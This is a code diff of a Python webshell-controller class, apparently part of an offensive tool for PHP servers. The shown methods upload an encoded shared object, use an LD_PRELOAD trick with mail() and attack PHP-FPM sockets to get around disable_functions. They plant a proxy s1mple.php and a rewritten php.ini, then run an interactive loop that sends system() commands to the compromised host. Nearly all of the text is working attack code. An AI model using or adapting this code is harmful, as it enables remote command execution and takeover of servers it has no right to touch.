@@ -161,72 +161,92 @@ class webshell:
             print("noooo,the way is bad")
             return None
         token = self.random_string()
-        a = open('bypass/LD_PRELOAD/s1mple.so', 'rb')
-        b = (base64.b64encode(a.read())).decode(encoding="utf-8")
-        a.close()
-        bypass_phpini = self.change_phpini().encode(encoding="utf-8")
-        base64_phpini = base64.b64encode(bypass_phpini)
-        attack_php_ini = base64_phpini.decode(encoding="utf-8")
         url = "http://" + self.urls
-        data = {self.pwd:"file_put_contents('/tmp/s1mple.so',base64_decode('" + b + "'));"}
-        php_payload = '<?php\nputenv("LD_PRELOAD=/tmp/s1mple.so");\nerror_log("",1,"","");\nmail("","","","");\necho "success";\n?>'
-        data1 = {self.pwd: "file_put_contents('/tmp/s1mple.php','" + php_payload + "');"}
-        if(self.way=="get"):
-            requests.get(url, params=data)
-            requests.get(url, params=data1)
+        shell_url = url + "/../s1mple.php"
+        req = requests.head(shell_url)
+        code = req.status_code
+        if (code == 200):
+            payload = "echo "+token+";echo 's1mple';echo "+token+";"
+            result = self.get_result_from_server(payload,token)
+            if('s1mple' in result):
+                while True:
+                    command = input("please input the command :")
+                    if (command == "exit"):
+                        exit()
+                    result_data = "echo %s;" % token + "system('" + command + "');echo %s;" % token
+                    reqcons = self.get_reuslt_from_server_without_split(result_data, shell_url)
+                    try:
+                        rere = reqcons.split(token, 2)[1]
+                    except:
+                        print("maybe the port is not open successly")
+                        break
+                    print(rere)
         else:
-            requests.post(url=url,data=data)
-            requests.post(url=url, data=data1)
-        data2 = {self.pwd:"echo "+token+";include('/tmp/s1mple.php');echo "+token+";"}#执行恶意命令；
-        upload_proxy = open("bypass/LD_PRELOAD/s1mple", "rb")
-        test_url = self.urls[::-1]
-        try:
-            test_int = test_url.index("/")
-        except:
-            test_int = 0
-        d = len(self.urls)
-        leng = d-test_int
-        shell_name = self.urls[leng::]
-        if (shell_name==''):
-            shell_name = "index.php"
-        else:
-            shell_name = shell_name
-        upload_proxy_content = upload_proxy.read().decode(encoding="utf-8").replace("/index.php", "/" + shell_name).encode(encoding="utf-8")
-        upload_proxy.close()
-        upload_proxy_contents = base64.b64encode(upload_proxy_content).decode(encoding="utf-8")
-        data3 = {self.pwd: "echo "+token+";file_put_contents('s1mple.php',base64_decode('" + upload_proxy_contents + "'));echo "+token+";"}
-        data4 = {self.pwd: "echo "+token+";file_put_contents('/tmp/php.ini',base64_decode('" + attack_php_ini + "'));echo "+token+";"}
-        if(self.way=="get"):
-            requests.get(url,params=data4)
-            print("start upload proxy-file")
-            requests.get(url, params=data3)
-        else:
-            requests.post(url=url,data=data4)
-            print("start upload proxy-file")
-            requests.post(url=url, data=data3)
-        try:
-            if(self.way=="post"):
-                requests.post(url=url,data=data2,timeout=1.5)
-                print("server new ports cant start;so cant use this bypass;please choose other")
+            a = open('bypass/LD_PRELOAD/s1mple.so', 'rb')
+            b = (base64.b64encode(a.read())).decode(encoding="utf-8")
+            a.close()
+            bypass_phpini = self.change_phpini().encode(encoding="utf-8")
+            base64_phpini = base64.b64encode(bypass_phpini)
+            attack_php_ini = base64_phpini.decode(encoding="utf-8")
+            data = {self.pwd:"file_put_contents('/tmp/s1mple.so',base64_decode('" + b + "'));"}
+            php_payload = '<?php\nputenv("LD_PRELOAD=/tmp/s1mple.so");\nerror_log("",1,"","");\nmail("","","","");\necho "success";\n?>'
+            data1 = {self.pwd: "file_put_contents('/tmp/s1mple.php','" + php_payload + "');"}
+            if(self.way=="get"):
+                requests.get(url, params=data)
+                requests.get(url, params=data1)
             else:
-                requests.get(url=url, params=data2, timeout=1.5)
-                print("server new ports cant start;so cant use this bypass;please choose other(post shell)")
-        except:
-            print("The malicious port has been opened : 65534")
-            shell_url = "http://"+self.urls+"/../"+"s1mple.php"
-            token = self.random_string()
-            while True:
-                command = input("please input the command :")
-                if(command=="exit"):
-                    exit()
-                result_data = "echo %s;"%token+"system('"+command+"');echo %s;"%token
-                reqcons = self.get_reuslt_from_server_without_split(result_data,shell_url)
-                try:
-                    rere = reqcons.split(token, 2)[1]
-                except:
-                    print("maybe the port is not open successly")
-                    break
-                print(rere)
+                requests.post(url=url,data=data)
+                requests.post(url=url, data=data1)
+            data2 = {self.pwd:"echo "+token+";include('/tmp/s1mple.php');echo "+token+";"}#执行恶意命令；
+            upload_proxy = open("bypass/LD_PRELOAD/s1mple", "rb")
+            test_url = self.urls[::-1]
+            try:
+                test_int = test_url.index("/")
+            except:
+                test_int = 0
+            d = len(self.urls)
+            leng = d-test_int
+            shell_name = self.urls[leng::]
+            if (shell_name==''):
+                shell_name = "index.php"
+            else:
+                shell_name = shell_name
+            upload_proxy_content = upload_proxy.read().decode(encoding="utf-8").replace("/index.php", "/" + shell_name).encode(encoding="utf-8")
+            upload_proxy.close()
+            upload_proxy_contents = base64.b64encode(upload_proxy_content).decode(encoding="utf-8")
+            data3 = {self.pwd: "echo "+token+";file_put_contents('s1mple.php',base64_decode('" + upload_proxy_contents + "'));echo "+token+";"}
+            data4 = {self.pwd: "echo "+token+";file_put_contents('/tmp/php.ini',base64_decode('" + attack_php_ini + "'));echo "+token+";"}
+            if(self.way=="get"):
+                requests.get(url,params=data4)
+                print("start upload proxy-file")
+                requests.get(url, params=data3)
+            else:
+                requests.post(url=url,data=data4)
+                print("start upload proxy-file")
+                requests.post(url=url, data=data3)
+            try:
+                if(self.way=="post"):
+                    requests.post(url=url,data=data2,timeout=1.5)
+                    print("server new ports cant start;so cant use this bypass;please choose other")
+                else:
+                    requests.get(url=url, params=data2, timeout=1.5)
+                    print("server new ports cant start;so cant use this bypass;please choose other(post shell)")
+            except:
+                print("The malicious port has been opened : 65534")
+                shell_url = "http://"+self.urls+"/../"+"s1mple.php"
+                token = self.random_string()
+                while True:
+                    command = input("please input the command :")
+                    if(command=="exit"):
+                        exit()
+                    result_data = "echo %s;"%token+"system('"+command+"');echo %s;"%token
+                    reqcons = self.get_reuslt_from_server_without_split(result_data,shell_url)
+                    try:
+                        rere = reqcons.split(token, 2)[1]
+                    except:
+                        print("maybe the port is not open successly")
+                        break
+                    print(rere)
 
     def test(self):
         token = self.random_string()
@@ -365,62 +385,83 @@ class webshell:
             print("noooo,the way is bad")
             return None
         token = self.random_string()
-        a = open('bypass/PHP_FPM/s1mple.so', 'rb')
-        b = (base64.b64encode(a.read())).decode(encoding="utf-8")
-        a.close()
         url = "http://" + self.urls
-        data = {self.pwd: "file_put_contents('/tmp/s1mple.so',base64_decode('" + b + "'));"}
-        requests.post(url=url, data=data)
-        data2 = {self.pwd: "echo " + token + ";include('/tmp/s1mple.php');echo " + token + ";"}  # 执行恶意命令；
-        upload_proxy = open("bypass/LD_PRELOAD/s1mple", "rb")
-        test_url = self.urls[::-1]
-        try:
-            test_int = test_url.index("/")
-        except:
-            test_int = 0
-        d = len(self.urls)
-        leng = d - test_int
-        shell_name = self.urls[leng::]
-        if (shell_name == ''):
-            shell_name = "index.php"
+        shell_url = url + "/../s1mple.php"
+        req = requests.head(shell_url)
+        code = req.status_code
+        if (code == 200):
+            payload = "echo " + token + ";echo 's1mple';echo " + token + ";"
+            result = self.get_result_from_server(payload, token)
+            if ('s1mple' in result):
+                while True:
+                    command = input("please input the command :")
+                    if (command == "exit"):
+                        exit()
+                    result_data = "echo %s;" % token + "system('" + command + "');echo %s;" % token
+                    reqcons = self.get_reuslt_from_server_without_split(result_data, shell_url)
+                    try:
+                        rere = reqcons.split(token, 2)[1]
+                    except:
+                        print("maybe the port is not open successly")
+                        break
+                    print(rere)
         else:
-            shell_name = shell_name
-        upload_proxy_content = upload_proxy.read().decode(encoding="utf-8").replace("/index.php",
-                                                                                    "/" + shell_name).encode(
-            encoding="utf-8")
-        upload_proxy.close()
-        upload_proxy_contents = base64.b64encode(upload_proxy_content).decode(encoding="utf-8")
-        data3 = {
-            self.pwd: "echo " + token + ";file_put_contents('s1mple.php',base64_decode('" + upload_proxy_contents + "'));echo " + token + ";"}
-        print("start upload proxy-file")
-        requests.post(url=url, data=data3)
-        try:
-            payloads = ["unix:///var/run/php5-fpm.sock","127.0.0.1:9000","unix:///var/run/php/php5-fpm.sock","unix:///var/run/php-fpm/php5-fpm.sock","unix:///var/run/php/php7-fpm.sock","/var/run/php/php7.2-fpm.sock","/usr/local/var/run/php7.3-fpm.sock","localhost:9000"]
-            for test in payloads:
-                php_payload = open('bypass/PHP_FPM/s1mple', 'rb')
-                php_base = (base64.b64encode(
-                    php_payload.read().decode(encoding="utf-8").replace("the_way_to_the_fpm", test).encode(
-                        encoding="utf-8"))).decode(encoding="utf-8")
-                php_payload.close()
-                data1 = {self.pwd: "file_put_contents('/tmp/s1mple.php',base64_decode('" + php_base + "'));"}
-                requests.post(url=url, data=data1)  # 写入攻击fpm的脚本文件
-                requests.post(url=url, data=data2, timeout=2)
-                print("trying other ways,please wait.....")
-        except:
-            print("The malicious port has been opened : 65534")
-            shell_url = "http://" + self.urls + "/../" + "s1mple.php"
-            token = self.random_string()
-            while True:
-                command = input("please input the command :")
-                if (command == "exit"):
-                    exit()
-                result_data = {self.pwd: "echo %s;" % token + "system('" + command + "');echo %s;" % token}
-                resul = requests.post(url=shell_url, data=result_data)
-                reqconss = resul.content
-                reqcons = reqconss.decode(encoding="utf-8")
-                rere = reqcons.split(token, 2)[1]
-                # return rere
-                print(rere)
+            a = open('bypass/PHP_FPM/s1mple.so', 'rb')
+            b = (base64.b64encode(a.read())).decode(encoding="utf-8")
+            a.close()
+            url = "http://" + self.urls
+            data = {self.pwd: "file_put_contents('/tmp/s1mple.so',base64_decode('" + b + "'));"}
+            requests.post(url=url, data=data)
+            data2 = {self.pwd: "echo " + token + ";include('/tmp/s1mple.php');echo " + token + ";"}  # 执行恶意命令；
+            upload_proxy = open("bypass/LD_PRELOAD/s1mple", "rb")
+            test_url = self.urls[::-1]
+            try:
+                test_int = test_url.index("/")
+            except:
+                test_int = 0
+            d = len(self.urls)
+            leng = d - test_int
+            shell_name = self.urls[leng::]
+            if (shell_name == ''):
+                shell_name = "index.php"
+            else:
+                shell_name = shell_name
+            upload_proxy_content = upload_proxy.read().decode(encoding="utf-8").replace("/index.php",
+                                                                                        "/" + shell_name).encode(
+                encoding="utf-8")
+            upload_proxy.close()
+            upload_proxy_contents = base64.b64encode(upload_proxy_content).decode(encoding="utf-8")
+            data3 = {
+                self.pwd: "echo " + token + ";file_put_contents('s1mple.php',base64_decode('" + upload_proxy_contents + "'));echo " + token + ";"}
+            print("start upload proxy-file")
+            requests.post(url=url, data=data3)
+            try:
+                payloads = ["unix:///var/run/php5-fpm.sock","127.0.0.1:9000","unix:///var/run/php/php5-fpm.sock","unix:///var/run/php-fpm/php5-fpm.sock","unix:///var/run/php/php7-fpm.sock","/var/run/php/php7.2-fpm.sock","/usr/local/var/run/php7.3-fpm.sock","localhost:9000"]
+                for test in payloads:
+                    php_payload = open('bypass/PHP_FPM/s1mple', 'rb')
+                    php_base = (base64.b64encode(
+                        php_payload.read().decode(encoding="utf-8").replace("the_way_to_the_fpm", test).encode(
+                            encoding="utf-8"))).decode(encoding="utf-8")
+                    php_payload.close()
+                    data1 = {self.pwd: "file_put_contents('/tmp/s1mple.php',base64_decode('" + php_base + "'));"}
+                    requests.post(url=url, data=data1)  # 写入攻击fpm的脚本文件
+                    requests.post(url=url, data=data2, timeout=2)
+                    print("trying other ways,please wait.....")
+            except:
+                print("The malicious port has been opened : 65534")
+                shell_url = "http://" + self.urls + "/../" + "s1mple.php"
+                token = self.random_string()
+                while True:
+                    command = input("please input the command :")
+                    if (command == "exit"):
+                        exit()
+                    result_data = {self.pwd: "echo %s;" % token + "system('" + command + "');echo %s;" % token}
+                    resul = requests.post(url=shell_url, data=result_data)
+                    reqconss = resul.content
+                    reqcons = reqconss.decode(encoding="utf-8")
+                    rere = reqcons.split(token, 2)[1]
+                    # return rere
+                    print(rere)
 
 
     def bypass_by_pwn(self,cmd):
